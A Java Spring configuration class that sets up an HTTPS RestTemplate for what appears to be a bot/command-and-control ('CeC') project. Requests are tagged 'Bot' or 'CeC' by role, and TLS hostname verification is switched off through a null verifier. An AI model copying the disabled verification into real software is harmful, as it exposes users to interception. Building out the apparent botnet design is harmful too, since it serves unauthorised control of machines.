package cs.sii.service.connection;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import org.apache.http.client.HttpClient;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.conn.ssl.TrustSelfSignedStrategy;
import org.apache.http.conn.ssl.TrustStrategy;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.ssl.SSLContextBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpRequest;
import org.springframework.http.MediaType;
import org.springframework.http.client.ClientHttpRequestExecution;
import org.springframework.http.client.ClientHttpRequestInterceptor;
import org.springframework.http.client.ClientHttpResponse;
import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.web.client.RestTemplate;

import cs.sii.config.onLoad.Config;

@Configuration
public class ConnectionServiceConfig {

	@Autowired
	Config configEngine;

	@Bean
	public MySSLClientHttpRequestFactory HttpRequestFactory()
			throws KeyManagementException, NoSuchAlgorithmException, KeyStoreException {
		NullHostnameVerifier verifier=new NullHostnameVerifier();
		MySSLClientHttpRequestFactory crf = new MySSLClientHttpRequestFactory(verifier);
		crf.setConnectTimeout(configEngine.getConnectTimeout());
//		crf.setConnectionRequestTimeout(configEngine.getRequestTimeout());
		crf.setReadTimeout(configEngine.getReadTimeout());

		return crf;
	    
	
	}

	@Bean
	public RestTemplate RestTemplate() throws KeyManagementException, NoSuchAlgorithmException, KeyStoreException {

		RestTemplate restTemplate = new RestTemplate(HttpRequestFactory());

		List<MediaType> mediaTypes = new ArrayList<MediaType>();
		mediaTypes.add(MediaType.TEXT_PLAIN);
		restTemplate.setInterceptors(Collections.singletonList(new XUserAgentInterceptor()));
		MappingJackson2HttpMessageConverter mc = new MappingJackson2HttpMessageConverter();
		mc.setSupportedMediaTypes(mediaTypes);
		restTemplate.getMessageConverters().add(mc);
		return restTemplate;
	}

	
	public class XUserAgentInterceptor implements ClientHttpRequestInterceptor {

	    @Override
	    public ClientHttpResponse intercept(
	            HttpRequest request, byte[] body, ClientHttpRequestExecution execution)
	            throws IOException {

	        HttpHeaders headers = request.getHeaders();
	    	if (!configEngine.isCommandandconquerStatus()) {
	        headers.add("X-User-Agent", "Bot");}
	    	else  headers.add("X-User-Agent", "CeC");
	        
	        return execution.execute(request, body);
	    }
	}
}
